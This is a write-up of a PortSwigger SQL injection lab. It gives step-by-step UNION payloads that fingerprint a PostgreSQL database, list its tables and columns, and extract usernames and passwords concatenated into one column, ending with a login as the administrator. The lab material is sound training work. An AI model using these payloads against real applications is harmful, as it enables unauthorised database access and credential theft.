# PortSwigger SQLi Lab #6 Write-Up

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

<br>

<br>

### **1. Determine the number of columns and data types returned from a query.**
Since it seems as if there are two columns, try to kill two birds with one stone. If there is a 200 status code, this means the first column is a string while there are two columns. It is known that only one column will be a string from the prompt of the lab.

```SQL
' UNION select 'a', NULL--
```
500 Internal Server Error
```SQL
' UNION select NULL, 'a'--
```
200 OK


<br>

> **Number of columns = 2**

> **Data types = unknown, string**

<br>

### **2. Determine the type/version of the database.**

<br>

Use the following portswigger cheat sheet.
https://portswigger.net/web-security/sql-injection/cheat-sheet

Microsoft Database Version Payload with 2 columns:
```SQL
' UNION SELECT NULL, @@version--
```
500 Internal Server Error, it is not a microsoft database.

PostgreSQL Database Version Payload with 2 columns:
```SQL
' UNION SELECT NULL, version()--
```
200 OK; it is a postgreSQL database.


``` HTML
<th>PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit</th>
```
<br>

> **Database Type = PostgreSQL**

<br>

### **3. Find the table names of the PostgresSQL databse.**

Using the cheatsheet:
```SQL
SELECT * FROM information_schema.tables
```
The correct way to specific table names in PostgreSQL is 'table_name'.

```SQL
' UNION SELECT NULL, table_name FROM information_schema.tables--
```
In the 200 response, the table 'users' can be find which likely has information of the usernames and passwords.

> **Table Name = 'users'**

<br>

### **4. Now find the column names of the 'users' table.**

From the cheat sheet:
```SQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

The payload:
```SQL
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--
```
The two columns 'username' and 'password' can be found in the response.

> **Column Names = username, password**

<br>

### **5. Now that the column names and table names is known, retreive multiple values in a single column.**

<br>

To retrevie multiple values in a single column use a the double verticle bars. 
This operator will separate each output in the same column by the listed characters.

```SQL
' UNION SELECT NULL, username||'~'||password FROM users--
```
In the 200 response, the following can be found:
```HTML
<th>
    administrator~cldx3xkz6lkikrst58su
</th>
```
> **Username = administrator**

> **Password = cldx3xkz6lkikrst58su**

<br>

### **6. Return to the website and login as the administrator.**

<br> 

### Congratulations! The lab has been completed!

